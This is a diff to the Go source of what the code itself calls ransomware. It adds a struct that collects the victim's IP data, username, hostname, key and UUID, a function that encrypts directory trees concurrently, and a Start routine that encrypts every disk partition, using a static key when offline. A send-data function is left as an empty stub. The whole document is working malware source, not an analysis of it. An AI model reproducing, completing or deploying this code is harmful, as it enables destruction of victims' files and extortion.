@@ -5,16 +5,30 @@ import (
 	"crypto/cipher"
 	"crypto/rand"
 	"fmt"
+	go_grab_ip "github.com/PaulDotSH/go-grab-ip"
 	"github.com/PaulDotSH/go-idle-info"
 	"github.com/shirou/gopsutil/disk"
 	"io"
 	"io/ioutil"
 	"os"
+	"os/user"
 	"path/filepath"
 	"runtime"
 	"strings"
 	"sync"
 )
+
+type RansomData struct {
+	IPData       go_grab_ip.IPData
+	Key          string
+	Username     string
+	ComputerName string
+	UUID         string
+}
+
+var CurrentRansomData RansomData
+
+//TODO: make encryption_windows and encryption_other
 
 func Encrypt(key, data []byte) []byte {
 	c, err := aes.NewCipher(key)
@@ -38,9 +52,6 @@ func Encrypt(key, data []byte) []byte {
 
 	return gcm.Seal(nonce, nonce, data, nil)
 }
-
-//TODO: make a function that encrypts specified paths concurrently
-//TODO: make a function that encrypts all drives from the pc (so main would be simpler)
 
 func Decrypt(key, data []byte) []byte {
 	c, err := aes.NewCipher(key)
@@ -153,6 +164,24 @@ func RecursivelyDecryptDirectory(startingPath string, key []byte) error {
 	})
 }
 
+func EncryptPathsConcurrently(paths []string, key []byte) {
+	var wg sync.WaitGroup
+	for _, path := range paths {
+		wg.Add(1)
+
+		path := path //because of how concurrency works, to make sure  everything is alright
+		go func() {
+			defer wg.Done()
+			err := RecursivelyEncryptDirectory(path, key)
+
+			if err != nil {
+				fmt.Println(err)
+			}
+		}()
+	}
+	wg.Wait()
+}
+
 func DecryptEveryPartition(key []byte) {
 	var wg sync.WaitGroup
 	partitions, _ := disk.Partitions(false)
@@ -204,4 +233,33 @@ func EncryptEveryPartition(key []byte) {
 	wg.Wait()
 
 	CreateMessage()
+}
+
+//Starts the ransomware, respecting all settings from settings.go
+func Start() {
+	_, e := go_grab_ip.GetIPData()
+	//No internet
+	if e != nil {
+		if !WaitForInternet { //only do this if there is no internet and wait for internet is false
+			Key = StaticKey
+			EncryptEveryPartition([]byte(Key))
+			return
+		}
+	}
+
+	//set ransom data variable
+	CurrentRansomData.UUID = UUID
+	CurrentRansomData.IPData = go_grab_ip.AwaitIPData()
+	CurrentRansomData.Key = Key
+
+	o, _ := user.Current()
+	CurrentRansomData.Username = o.Username
+	hostname, _ := os.Hostname()
+	CurrentRansomData.ComputerName = hostname
+
+	EncryptEveryPartition([]byte(Key))
+}
+
+func SendRansomData() {
+	// use the endpoint we defined
 }
